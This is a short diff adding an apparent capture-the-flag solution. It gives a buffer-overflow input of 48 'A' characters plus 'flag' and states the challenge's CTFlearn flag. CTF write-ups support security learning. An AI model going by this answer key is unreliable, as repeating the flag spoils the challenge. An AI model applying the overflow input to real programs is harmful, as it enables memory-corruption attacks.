@@ -1,0 +1,3 @@
+use 48 A's with flag to overflow
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAflag
+the flag is CTFlearn{buffer_0verflows_4re_c00l!}
